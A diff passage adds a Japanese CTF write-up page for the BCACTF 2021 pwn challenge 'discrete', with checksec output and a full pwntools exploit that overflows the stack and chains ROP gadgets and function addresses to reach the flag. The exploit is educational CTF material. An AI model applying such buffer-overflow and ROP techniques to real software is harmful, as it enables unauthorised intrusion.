+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;I&#39;m sorry, but you obviously don&#39;t care about grades.&#34;</span><span class="p">);</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Therefore, you aren&#39;t motivated enough to be in our class.&#34;</span><span class="p">);</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Goodbye.&#34;</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Your quiz have been posted to Schoology.&#34;</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You have twenty minutes.&#34;</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Good luck.&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><br>
+<h3 id="solution-3">Solution</h3>
+<p>以下、checksecの出力結果です。</p>
+<pre>
+$ checksec discrete
+[*] '/home/captureamerica/OneDrive/CTF/BCACTF_2021/Pwn/discrete'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</pre>
+<br>
+各関数に飛んでグローバル変数を立てた後、quiz()関数に飛ぶとフラグが取れる寸法です。
+<p>まずは、いくつかの方程式を自力で解かないといけません。久しぶりに数学やったな〜。</p>
+<br>
+ここで、BOFを起こした後、飛んだ先の関数で Segmentation fault を出して終了してしまう問題にぶち当たりました。
+<p>他の関数(quiz)を挟むことで回避できたので、そのようなコードになってます。後で他の方がどうやって解いたのか、参考にさせてもらおうと思います。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="hl"><span class="lnt">28
+</span></span><span class="lnt">29
+</span><span class="hl"><span class="lnt">30
+</span></span><span class="lnt">31
+</span><span class="hl"><span class="lnt">32
+</span></span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="hl"><span class="lnt">35
+</span></span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding:utf-8 -*-</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;critical&#39;</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./discrete&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span>
+<span class="n">addr_logic</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;logic&#34;</span><span class="p">]</span>
+<span class="n">addr_algebra</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;algebra&#34;</span><span class="p">]</span>
+<span class="n">addr_functions</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;functions&#34;</span><span class="p">]</span>
+<span class="n">addr_quiz</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;quiz&#34;</span><span class="p">]</span>
+<span class="n">addr_main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;main&#34;</span><span class="p">]</span>
+<span class="n">rdi_ret</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;pop rdi; ret&#39;</span><span class="p">)))</span>
+<span class="n">nop</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;nop&#39;</span><span class="p">)))</span>
+
+<span class="k">if</span> <span class="mi">0</span><span class="p">:</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./discrete&#39;</span><span class="p">)</span>
+    <span class="c1"># s = remote(&#39;localhost&#39;, 7777)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;bin.bcactf.com&#39;</span><span class="p">,</span> <span class="mi">49160</span><span class="p">)</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">64</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;i will get an A</span><span class="se">\x00</span><span class="s1">&#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span>
+<span class="hl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_quiz</span><span class="p">)</span>
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_logic</span><span class="p">)</span>
+<span class="hl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_quiz</span><span class="p">)</span>
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_functions</span><span class="p">)</span>
+<span class="hl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_quiz</span><span class="p">)</span>
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_algebra</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_quiz</span><span class="p">)</span>
+<span class="hl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_main</span><span class="p">)</span>
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_quiz</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># logic</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;p: &#34;</span><span class="p">,</span> <span class="s2">&#34;1</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;q: &#34;</span><span class="p">,</span> <span class="s2">&#34;0</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>  <span class="c1"># This has to be 0 becaues of &#39;(q != s)&#39;.</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;r: &#34;</span><span class="p">,</span> <span class="s2">&#34;1</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>  <span class="c1"># </span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;s: &#34;</span><span class="p">,</span> <span class="s2">&#34;1</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>  <span class="c1"># This has to be 1.</span>
+
+<span class="c1"># functions</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;a: &#34;</span><span class="p">,</span> <span class="s2">&#34;2</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;b: &#34;</span><span class="p">,</span> <span class="s2">&#34;-8</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;c: &#34;</span><span class="p">,</span> <span class="s2">&#34;6</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+
+<span class="c1"># algebra</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;x: &#34;</span><span class="p">,</span> <span class="s2">&#34;3</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;y: &#34;</span><span class="p">,</span> <span class="s2">&#34;-17</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;z: &#34;</span><span class="p">,</span> <span class="s2">&#34;12</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recvall</span><span class="p">())</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br /></p>
+<p>Flag: <code>bcactf{the_limit_as_t_approaches_the_ctf_of_my_sanity_approaches_0}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<hr>
+<p><br /><br />
+<br /><br /></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">CaptureAmerica @ CTF フラxxグゲット</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2021-06-20
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="https://captureamerica.github.io/writeups/post/shellctf_2021/">
+            <span class="next-text nav-default">S.H.E.L.L. CTF 2021 Writeup</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
+  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2021<span class="heart"><i class="iconfont icon-heart"></i></span><span>CaptureAmerica @ CTF フラxxグゲット</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  
+
+
+
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-104910699-2', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
